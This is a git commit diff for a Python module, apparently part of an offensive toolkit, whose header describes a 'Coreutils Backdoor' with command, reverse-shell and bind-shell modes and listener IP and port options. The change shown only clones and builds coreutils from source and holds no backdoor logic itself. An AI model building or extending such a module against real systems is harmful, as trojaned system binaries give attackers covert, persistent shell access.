fb58c92c1c5532d85ebd31924132702172d9a5d5
dd <54325660+sud0k1ller@users.noreply.github.com>
2021-04-09 13:45:15 +0200

    Change: tarball sources -> git repo

--- modules/coreurils_backdoor.py
+++ modules/coreurils_backdoor.py
@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 #[ONLINE][Backdoor] Coreutils Backdoor
 #MODE,yes,Mode to use (cmd, rev, bind)
+#STATIC,no,Build biniaries as static
 #CMD,no,Command to execute while calling choosen coreutils binaries
 #LISTENER_IP,no,IP address to send reverse shell to
 #LISTENER_PORT,no,TCP port of listener
@@ -15,15 +16,21 @@ def check_coreutils_version():
     return coreutils_version.split('-')[0]
 
 def get_coreutils_sources(coreutils_version):
-    coreutils_download_directory = "/tmp/coreutils_source_" + coreutils_version
-    #os.system("wget -c https://github.com/coreutils/coreutils/archive/refs/tags/v" + coreutils_version + ".tar.gz -O " + pam_download_directory + " && mkdir /tmp/coreutils_source && tar -xf " + coreutils_download_directory + " -C /tmp/coreutils_source --strip-components 1")
-    print("wget -c https://github.com/coreutils/coreutils/archive/refs/tags/v" + coreutils_version + ".tar.gz -O " + coreutils_download_directory + " && mkdir /tmp/coreutils_source && tar -xf " + coreutils_download_directory + " -C /tmp/coreutils_source --strip-components 1")
-    #return pam_download_directory
+    os.system("cd /tmp && git clone https://github.com/coreutils/coreutils.git && cd /tmp/coreutils && git checkout v" + coreutils_version)
 
 def clean_sources():
-    os.system('rm -rf /tmp/coreutils_sources*')
+    os.system("rm -rf /tmp/coreutils_source*")
+
+def build_sources():
+    os.system("cd /tmp/coreutils && ./bootstrap") #
+    os.system("cd /tmp/coreutils && export FORCE_UNSAFE_CONFIGURE=1 && ./configure") #
+    os.system("cd /tmp/coreutils && sed -i 's/IO_ftrylockfile/IO_EOF_SEEN/' lib/*.c && echo '#define _IO_IN_BACKUP 0x100' >> lib/stdio-impl.h") # Add glibc2.28 patch
+    os.system("cd /tmp/coreutils && make CFLAGS='-Wno-error'") #
+    os.system("unset FORCE_UNSAFE_CONFIGURE")
 
 def main(arguments):
-    pass
+    #get_coreutils_sources(check_coreutils_version())
+    build_sources()
+    clean_sources()
 
-get_coreutils_sources(check_coreutils_version())
+main("null")
